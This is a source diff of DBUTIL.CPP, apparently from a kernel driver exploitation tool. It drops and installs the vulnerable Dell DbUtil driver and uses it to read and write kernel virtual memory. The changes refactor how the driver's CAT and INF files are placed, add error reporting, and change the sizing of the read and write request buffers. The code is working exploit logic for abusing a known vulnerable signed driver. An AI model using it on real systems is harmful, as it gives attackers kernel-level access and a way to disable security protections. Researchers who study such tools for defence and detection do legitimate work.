@@ -4,9 +4,9 @@
 *
 *  TITLE:       DBUTIL.CPP
 *
-*  VERSION:     1.20
+*  VERSION:     1.27
 *
-*  DATE:        08 Feb 2022
+*  DATE:        14 Nov 2022
 *
 *  Dell BIOS Utility driver routines.
 *
@@ -41,75 +41,91 @@ BOOL DbUtilManageFiles(
 )
 {
     BOOL bResult = FALSE;
-    DWORD cch;
     LPWSTR lpEnd;
-    WCHAR szFileName[MAX_PATH * 2];
+    LPWSTR lpFileName;
+
+    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
+    SIZE_T allocSize = 64 +
+        ((_strlen(DBUTILCAT_FILE) + _strlen(DBUTILINF_FILE)) * sizeof(WCHAR)) +
+        CurrentDirectory->Length;
+
+    ULONG length, lastError = ERROR_SUCCESS;
 
     if (DoInstall) {
 
         //
         // Drop DbUtilDrv2.
         //
-        if (!KDUProvExtractVulnerableDriver(Context))
+        if (!KDUProvExtractVulnerableDriver(Context)) {
+            SetLastError(ERROR_INTERNAL_ERROR);
             return FALSE;
+        }
 
         //
         // Drop cat and inf files.
         //
-        RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
-        cch = supExpandEnvironmentStrings(L"%temp%\\", szFileName, MAX_PATH);
-        if (cch == 0 || cch > MAX_PATH) {
-            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-        }
-        else {
-            lpEnd = _strend(szFileName);
+        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
+        if (lpFileName) {
 
-            _strcat(szFileName, DBUTILCAT_FILE);
-            if (supExtractFileFromDB(Context->ModuleBase, szFileName, IDR_DATA_DBUTILCAT)) {
+            length = CurrentDirectory->Length / sizeof(WCHAR);
+
+            _strncpy(lpFileName,
+                length,
+                CurrentDirectory->Buffer,
+                length);
+
+            lpEnd = _strcat(lpFileName, L"\\");
+            _strcat(lpFileName, DBUTILCAT_FILE);
+            if (supExtractFileFromDB(Context->ModuleBase, lpFileName, IDR_DATA_DBUTILCAT)) {
                 *lpEnd = 0;
-                _strcat(szFileName, DBUTILINF_FILE);
-                if (supExtractFileFromDB(Context->ModuleBase, szFileName, IDR_DATA_DBUTILINF)) {
+                _strcat(lpFileName, DBUTILINF_FILE);
+                if (supExtractFileFromDB(Context->ModuleBase, lpFileName, IDR_DATA_DBUTILINF)) {
 
                     g_DbUtilDevInfo = NULL;
 
-                    bResult = supSetupInstallDriverFromInf(szFileName,
+                    bResult = supSetupInstallDriverFromInf(lpFileName,
                         (PBYTE)&g_DbUtilHardwareId,
                         sizeof(g_DbUtilHardwareId),
                         &g_DbUtilDevInfo,
                         &g_DbUtilDevInfoData);
 
+                    if (!bResult) 
+                        lastError = GetLastError();
+
                 }
             }
-        }
 
+            supHeapFree(lpFileName);
+        }
     }
     else {
 
-        //
-        // Remove cat/inf files.
-        //
-        RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
-        cch = supExpandEnvironmentStrings(L"%temp%\\", szFileName, MAX_PATH);
-        if (cch == 0 || cch > MAX_PATH) {
-            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-        }
-        else {
+        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
+        if (lpFileName) {
 
-            lpEnd = _strend(szFileName);
+            length = CurrentDirectory->Length / sizeof(WCHAR);
 
-            _strcat(szFileName, DBUTILCAT_FILE);
-            DeleteFile(szFileName);
+            _strncpy(lpFileName,
+                length,
+                CurrentDirectory->Buffer,
+                length);
+
+            lpEnd = _strcat(lpFileName, L"\\");
+            _strcat(lpFileName, DBUTILCAT_FILE);
+            DeleteFile(lpFileName);
 
             *lpEnd = 0;
 
-            _strcat(szFileName, DBUTILINF_FILE);
-            DeleteFile(szFileName);
+            _strcat(lpFileName, DBUTILINF_FILE);
+            DeleteFile(lpFileName);
 
-
+            supHeapFree(lpFileName);
             bResult = TRUE;
         }
 
     }
+
+    SetLastError(lastError);
     return bResult;
 }
 
@@ -125,8 +141,9 @@ BOOL DbUtilStartVulnerableDriver(
     _In_ KDU_CONTEXT* Context
 )
 {
-    BOOL     bLoaded = FALSE;
-    LPWSTR   lpDeviceName = Context->Provider->DeviceName;
+    BOOL          bLoaded = FALSE;
+    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
+    LPWSTR        lpDeviceName = provLoadData->DeviceName;
 
     //
     // Check if driver already loaded.
@@ -153,6 +170,10 @@ BOOL DbUtilStartVulnerableDriver(
     //
     if (bLoaded) {
         KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
+    }
+    else {
+        supPrintfEvent(kduEventError,
+            "[!] Vulnerable driver is not loaded, GetLastError 0x%lX\r\n", GetLastError());
     }
 
     return (Context->DeviceHandle != NULL);
@@ -198,12 +219,10 @@ BOOL WINAPI DbUtilReadVirtualMemory(
     BOOL bResult = FALSE;
 
     SIZE_T size;
-    ULONG value;
     DWORD dwError = ERROR_SUCCESS;
     DBUTIL_READWRITE_REQUEST* pRequest;
 
-    value = FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;
-    size = ALIGN_UP_BY(value, PAGE_SIZE);
+    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;
 
     pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -259,13 +278,11 @@ BOOL WINAPI DbUtilWriteVirtualMemory(
     BOOL bResult = FALSE;
 
     SIZE_T size;
-    ULONG value;
     DWORD dwError = ERROR_SUCCESS;
 
     DBUTIL_READWRITE_REQUEST* pRequest;
 
-    value = FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;
-    size = ALIGN_UP_BY(value, PAGE_SIZE);
+    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;
 
     pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
